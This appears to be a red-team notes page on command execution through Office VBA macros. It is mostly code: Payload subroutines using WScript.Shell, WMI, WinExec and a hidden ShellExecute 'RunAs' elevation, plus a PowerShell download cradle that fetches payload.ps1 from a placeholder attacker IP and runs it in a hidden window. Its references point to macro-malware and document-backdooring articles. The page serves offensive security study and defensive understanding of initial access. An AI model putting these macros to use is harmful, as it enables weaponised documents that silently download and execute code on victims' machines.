# Command Execution

## Execute Commands

> [!INFO] Limited String Characters
> VBA Macro has a 50 characters string limit so you have to concatenate it. Use [[Macro Formatting Scripts|scripts]] to split the chunks.

### Scripting

Simple command execution via concatenation.

```vb
Sub Payload()
	Dim objShell As Object
	Set objShell = CreateObject("WScript.Shell")
    Dim Str As String
    
    Str = Str + ""

	' CreateObject("WScript.Shell").Run "<commands>", 1, True
    objShell.Run Str, 1, True
End Sub
```

VBA specific command execution.

```vb
Public Function Payload() As Variant
    Dim WindowScriptHost As Object
    Set WindowScriptHost = VBA.CreateObject("WScript.Shell")
    Dim waitOnReturn As Boolean: waitOnReturn = True
    Dim windowStyle As Integer: windowStyle = 7
    WindowScriptHost.Run "<commands>", windowStyle, waitOnReturn
End Function
```

Control the execution asynchronously.

```vb
Sub Payload()
	Dim objShell As Object
	Set objShell = CreateObject("WScript.Shell")

	' If set to True it will execute the shell asynchronous and wait for it to finish
	' If set to False it will not wait for the execution process to finish if there's a next line
	objShell.Run "powershell.exe -Command ""IEX (New-Object Net.WebClient).DownloadString('http[s]://<IP>[:PORT]/payload.ps1')""", 0, True

End Sub
```

Another variant using WMI to execute process.

```vb
Sub WMI_Execution()
    Set Wmi = GetObject("winmgmts:\\.\root\cimv2")
    Set Process = Wmi.Get("Win32_Process")
    Process.Create("<commands>")
End Sub
```

### WinAPI

```vb
Declare Function WinExec Lib "kernel32" ( _
     ByVal lpCmdLine As String, _
     ByVal nCmdShow As Long _
) As Long

Const SHOW_HIDE As Long = 0

Sub ExecuteFile()
     WinExec "C:\Windows\System32\notepad.exe", SHOW_HIDE
End Sub
```

## Run As Administrator

```vb
Private Declare PtrSafe Function ShellExecute Lib "shell32.dll" _
    Alias "ShellExecuteA" ( _
    ByVal hwnd As Long, _
    ByVal lpOperation As String, _
    ByVal lpFile As String, _
    ByVal lpParameters As String, _
    ByVal lpDirectory As String, _
    ByVal nShowCmd As Long) As Long

Private Const SW_HIDE = 0
Private Const SW_NORMAL = 1

Sub Execute()
    ShellExecute 0, "RunAs", "C:\Windows\System32\cmd.exe", "[arguments]", "", SW_HIDE
    ' ShellExecute 0, "Open", "C:\Windows\System32\cmd.exe", "[arguments]", "", SW_HIDE
End Sub
```

---
## References

### Backlinks

- [[Document Templates]]

### MalAPI

- [MalAPI: WinExec](https://malapi.io/winapi/WinExec)

### Cocomelonc

- [Cocomelonc: Leveraging Office macros for malware](https://cocomelonc.github.io/malware/2025/07/01/malware-tricks-48.html)

### mgeeky

- [mgeeky: Backdooring Office Structures. Part 1: The Oldschool](https://mgeeky.tech/backdooring-office-structures-part-1-oldschool/)

- [mgeeky: Backdooring Office Structures. Part 2: Payload Crumbs In Custom Parts](https://mgeeky.tech/payload-crumbs-in-custom-parts/)

### Denwp

- [Denwp: From Base64 to Reverse Shell - Unpacking Malware from a Word Document](https://denwp.com/macro-word-document/)

### Sevagas

- [sevagas: Advanced_Initial_access_in_2024_OffensiveX](https://github.com/sevagas/Advanced_Initial_access_in_2024_OffensiveX/blob/main/breach_the_gates_extended.pdf)

### War Room

- [War Room: Metasploit Module of the Month Web Delivery](https://warroom.rsmus.com/metasploit-module-of-the-month-web_delivery/)